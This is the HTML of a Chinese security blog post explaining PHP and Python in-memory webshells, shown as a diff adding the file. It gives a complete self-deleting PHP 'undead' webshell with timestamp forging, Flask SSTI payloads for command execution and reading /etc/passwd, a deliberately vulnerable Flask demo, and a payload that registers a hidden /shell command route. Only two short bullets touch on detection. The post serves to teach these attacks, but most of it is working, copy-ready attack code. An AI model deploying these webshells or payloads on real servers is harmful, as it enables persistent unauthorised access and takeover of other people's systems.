@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"npfs06.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="浅析php&amp;python内存马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅析php&amp;python内存马">
+<meta property="og:url" content="https://npfs06.top/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="安小琪&#39;s blog">
+<meta property="og:description" content="浅析php&amp;python内存马">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://img.npfs06.top/20210927000700.png">
+<meta property="og:image" content="http://img.npfs06.top/20210929204425.png">
+<meta property="og:image" content="http://img.npfs06.top/20210927001824.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930001322.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930001355.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930001417.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930001449.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930001545.png">
+<meta property="og:image" content="http://img.npfs06.top/20210929235842.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930084309.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930084409.png">
+<meta property="og:image" content="https://npfs06.top/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210930084519831.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930084757.png">
+<meta property="og:image" content="http://img.npfs06.top/20210929235746.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930000504.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930003251.png">
+<meta property="og:image" content="http://img.npfs06.top/20210930083133.png">
+<meta property="article:published_time" content="2021-09-30T09:10:51.000Z">
+<meta property="article:modified_time" content="2021-09-30T09:10:51.000Z">
+<meta property="article:author" content="安小琪">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img.npfs06.top/20210927000700.png">
+
+<link rel="canonical" href="https://npfs06.top/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>浅析php&python内存马 | 安小琪's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">安小琪's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">少年有梦，不应止于心动</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://npfs06.top/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="安小琪">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安小琪's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          浅析php&python内存马
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-09-30 17:10:51" itemprop="dateCreated datePublished" datetime="2021-09-30T17:10:51+08:00">2021-09-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>浅析php&amp;python内存马<a id="more"></a></p>
+<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>webshell的变迁过程大致如下所述：</p>
+<p>web服务器管理页面——&gt; 大马——&gt;小马拉大马——&gt;一句话木马——&gt;加密一句话木马——&gt;加密内存马</p>
+<img src="http://img.npfs06.top/20210927000700.png" style="zoom:80%;">
+
+
+
+<p>传统Webshell连接方式，都是先通过某种漏洞将恶意的脚本木马文件上传，然后通过中国菜刀，或者蚁剑，冰蝎等Webshell管理软件进行链接。</p>
+<img src="http://img.npfs06.top/20210929204425.png" style="zoom:80%;">
+
+
+
+<p>这种方式目前仍然流行，但是由于近几年防火墙，IDS，IPS，流量分析等各种安全设备的普及和更新，这种连接方式非常容易被设备捕获拦截，而且由于文件是明文存放在服务器端，所以又很容易被杀毒软件所查杀。</p>
+<pre><code>    内存 webshell 相比于常规 webshell 更容易躲避传统安全监测设备的检测，**Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地**。其通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存 Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。
+</code></pre>
+<h1 id="webshell内存马使用"><a href="#webshell内存马使用" class="headerlink" title="webshell内存马使用"></a>webshell内存马使用</h1><p>新版本的冰蝎，可以直接进行注入内存马</p>
+<img src="http://img.npfs06.top/20210927001824.png" style="zoom:80%;">
+
+
+
+<h1 id="PHP-内存马"><a href="#PHP-内存马" class="headerlink" title="PHP 内存马"></a>PHP 内存马</h1><p>PHP内存马想必大家都不陌生，是线下AWD中常用手段之一。在蚁剑中也有专门的插件可以一键注入内存马</p>
+<p>php 内存马也就是 php 不死马，它的原理是将一个木马反复写入，在内存中执行死循环，使管理员无法删除木马文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">	set_time_limit(<span class="number">0</span>);</span><br><span class="line">	unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="string">&#x27;/var/www/dvwa/.ski12.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@system($_POST[a]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">		system(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .ski12.php&#x27;</span>);</span><br><span class="line">		usleep(<span class="number">5000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</li>
+<li>set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</li>
+<li>unlink(<strong>FILE</strong>)删除文件本身，以起到隐蔽自身的作用。</li>
+<li>while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过<code>find –name \&#39;*.php\&#39; –mmin -10</code>命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。</li>
+</ul>
+<p>至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。</p>
+<h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><ul>
+<li>检查所有 php 进程处理请求的持续时间</li>
+<li>检测执行文件是否在文件系统真实存在</li>
+</ul>
+<h1 id="Python-内存马"><a href="#Python-内存马" class="headerlink" title="Python 内存马"></a>Python 内存马</h1><p>我们常用的python框架有django、flask。两者都可能存在ssti漏洞。</p>
+<p>Python 内存马利用 flask 框架中 SSTI 注入来实现，flask 框架中在 web 应用模板渲染的过程中用到 <code>render_template_string()</code> 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 python 内存马的注入。</p>
+<blockquote>
+<p>render_template_string() 用来渲染一个字符串</p>
+</blockquote>
+<p>在JAVA内存马中，实现最简单的内存马在于tomcat的路由机制filter。而我们想在python中实现内存马，首先需要考虑的是flask 是否能动态注册路由。</p>
+<p>flask 常规注册的方式为使用装饰器 <code>@app.route()</code> 。而实际工作的函数为装饰器里调用的方法 <code>self.add_url_rule()</code> </p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.add<span class="constructor">_url_rule(&#x27;<span class="operator">/</span><span class="params">index</span><span class="operator">/</span>&#x27;,<span class="params">endpoint</span>=&#x27;<span class="params">index</span>&#x27;,<span class="params">view_func</span>=<span class="params">index</span>)</span></span><br></pre></td></tr></table></figure>
+<p>self.add_url_rule的三个参数：</p>
+<ol>
+<li>url<br>与app.route()的第一个参数一样。必须以<code>/</code>开始</li>
+<li>endpoint<br>站点，使用url_for进行反转时，这个里面传入的第一个参数时endpoint的值。url_for反转是通过视图函数名得到路径，所以若不指定该值，则默认值为函数名</li>
+<li>view_func<br>方法。只需要写方法名（也可以为匿名参数），如果使用方法名不要加括号，加括号表示将函数的返回值传给了view_func参数了，程序就会直接报错</li>
+</ol>
+<h2 id="flask-context"><a href="#flask-context" class="headerlink" title="flask context"></a>flask context</h2><p>添加路由成功，想要实现内存webshell，关键在于view_func。view_func可以采用匿名函数的方式，该函数要实现实现捕获参数值、执行命令、响应。</p>
+<p>Flask 的工作原理：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当一个网页请求进入 Flask，会实例化一个Request Context。在python中分出了两种上下文，请求上下文(request <span class="built_in">context</span>)和应用上下文(session <span class="built_in">context</span>)。一个请求上下文中封装了请求的信息。而上下文的结构是运用了一个Stack的栈结构，也就是说它拥有一个栈所拥有的全部特性。request <span class="built_in">context</span>实例化后，它会被<span class="built_in">push</span>到栈_request_ctx_stack中，那我们可以通过获取栈顶元素的方法来获取当前的请求。</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h2><p>Flask使用Jinja2渲染引擎，以<code>&#123;&#123;&#125;&#125;`作为变量包裹的标识符同时，这个符号包裹内还可以执行一些简单的表达式 ,模板引擎会对输入变量进行编码转义
+
+**对象的魔术方法：**
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+
+虽然通过 `&#123;&#123;...&#125;&#125;</code> 执行表达式，但是命名空间是受限的，没有 <code>builtins</code>，所以 <code>eval</code>、<code>popen</code> 这些函数是不能使用的。但是我们可以通过任意一个函数的 <code>func_globals</code> 从而得到其命名空间，进而得到 <code>builtins</code>。</p>
+<h3 id="builtins-函数科普"><a href="#builtins-函数科普" class="headerlink" title="__builtins__ 函数科普"></a>__builtins__ 函数科普</h3><p>这里简单介绍下python的内置函数_<em>builtins_\</em> 。通过dir(__builtins__)可以查看内置函数，展示所有内置类型和函数。</p>
+<img src="http://img.npfs06.top/20210930001322.png" style="zoom:80%;">
+
+<p>我们先来看最基础的__import__函数</p>
+<p># 直接调用</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__builtins__</span><span class="selector-class">.__import__</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.system</span>(<span class="string">&#x27;dir&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<img src="http://img.npfs06.top/20210930001355.png" style="zoom:80%;">
+
+<p># 通过dict访问</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">__builtins__</span>.</span><span class="module"><span class="identifier">__dict__</span>[</span></span>‘import<span class="constructor">__(&#x27;<span class="params">os</span>&#x27;)</span>’].system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+<img src="http://img.npfs06.top/20210930001417.png" style="zoom:80%;">
+
+<p> 玩一些花样-转码</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__builtins__</span><span class="selector-class">.__dict__</span><span class="selector-attr">[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)]</span>(<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))<span class="selector-class">.system</span>(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<img src="http://img.npfs06.top/20210930001449.png" style="zoom:80%;">
+
+<p>此外还有file、open、eval等函数</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__dict__</span>.<span class="variable">__getitem__</span>(<span class="string">&#x27;file&#x27;</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__dict__</span>.<span class="variable">__getitem__</span>(<span class="string">&#x27;open&#x27;</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__dict__</span>.<span class="variable">__getitem__</span>(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p># import 其他模块</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;commands&#x27;</span>).getoutput(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;commands&#x27;</span>).getstatusoutput(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).<span class="built_in">call</span>([<span class="string">&#x27;id&#x27;</span>],shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<img src="http://img.npfs06.top/20210930001545.png" style="zoom:80%;">
+
+<p>关于import还有其他一些有意思的操作，包括reload方法、设置sys.modules[‘os’]、execfile等。</p>
+<p><strong>回到正题，Flask 内置了两个函数 <code>url_for</code> 和 <code>get_flashed_messages</code>。也就是构造命令执行可以使用：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.values.get(<span class="string">&#x27;param&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<img src="http://img.npfs06.top/20210929235842.png" style="zoom:80%;">
+
+
+
+<p>将 payload 拆解开：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">	<span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">		&#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">		&#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">		lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">		)</span></span><br><span class="line"><span class="string">	&quot;</span>,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">		<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h3 id="payload-解析"><a href="#payload-解析" class="headerlink" title="payload 解析"></a>payload 解析</h3><p><code> url_for.globals[&#39;builtins&#39;][&#39;eval&#39;]</code></p>
+<p>这个是Flask SSTI中的payload。</p>
+<p>url_for()是Flask的一个内置函数：</p>
+<img src="http://img.npfs06.top/20210930084309.png" style="zoom:80%;">
+
+<p>通过Flask内置函数可以调用其<code>__globals__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules，这里看到是支持<code>__builtins__</code>的：</p>
+<img src="http://img.npfs06.top/20210930084409.png" style="zoom:80%;">
+
+<p><code>__builtins__</code>即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。其中是包含eval、exec等函数的：</p>
+<p><img src="/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210930084519831.png" alt="image-20210930084519831"></p>
+<p><strong>app.add_url_rule()函数</strong></p>
+<p>在Flask中注册路由的时候是添加的[<code>@app.route</code>装饰器来实现的。</p>
+<p>点进去看到其源码实现，其调用了add_url_rule()函数来添加路由：</p>
+<img src="http://img.npfs06.top/20210930084757.png" style="zoom:80%;">
+
+<p>add_url_rule()函数定义：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add<span class="constructor">_url_rule(<span class="params">rule</span>, <span class="params">endpoint</span>=None, <span class="params">view_func</span>=None, <span class="params">provide_automatic_options</span>=None, <span class="operator">**</span><span class="params">options</span>)</span></span><br></pre></td></tr></table></figure>
+<p>参数说明：</p>
+<ul>
+<li>rule：函数对应的URL规则，满足条件和app.route()的第一个参数一样，必须以<code>/</code>开头；</li>
+<li>endpoint：端点，即在使用url_for()进行反转的时候，这里传入的第一个参数就是endpoint对应的值。这个值也可以不指定，那么默认就会使用函数的名字作为endpoint的值；</li>
+<li>view_func：URL对应的函数（注意，这里只需写函数名字而不用加括号）；</li>
+<li>provide_automatic_options：控制是否应自动添加选项方法。这也可以通过设置视图来控制_func.provide_automatic_options =添加规则前为False；</li>
+<li>options：要转发到基础规则对象的选项。Werkzeug的一个变化是处理方法选项。方法是此规则应限制的方法列表（GET、POST等）。默认情况下，规则只侦听GET（并隐式地侦听HEAD）。从Flask0.6开始，通过标准请求处理隐式添加和处理选项；</li>
+</ul>
+<p>由此可见，payload这部分是动态添加了一条路由，而处理该路由的函数是个由lambda关键字定义的匿名函数。</p>
+<p><strong>lambda 即匿名函数</strong>，payload 中 <code>add_url_rule()</code> 函数的第三个参数定义了一个 lambda 匿名函数，其中通过 os 库的 popen() 函数执行从 Web 请求中获取的 <code>cmd</code> 参数值并返回结果，其中该参数值默认为 <code>whoami</code>。</p>
+<p><strong>_request_ctx_stack</strong>是Flask的一个全局变量，是一个LocalStack实例。</p>
+<p>Flask请求上下文管理机制：当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中，也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code> 。</p>
+<p>eval() 方法的语法：</p>
+<p> <code>eval(expression[, globals[, locals]]) </code> </p>
+<p>globals - 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。指定全局变量。</p>
+<img src="http://img.npfs06.top/20210929235746.png" style="zoom:80%;">
+
+
+
+<p>使用ssti打payload后访问<code>/shell?cmd=</code>即可执行命令</p>
+<img src="http://img.npfs06.top/20210930000504.png" style="zoom:80%;">
+
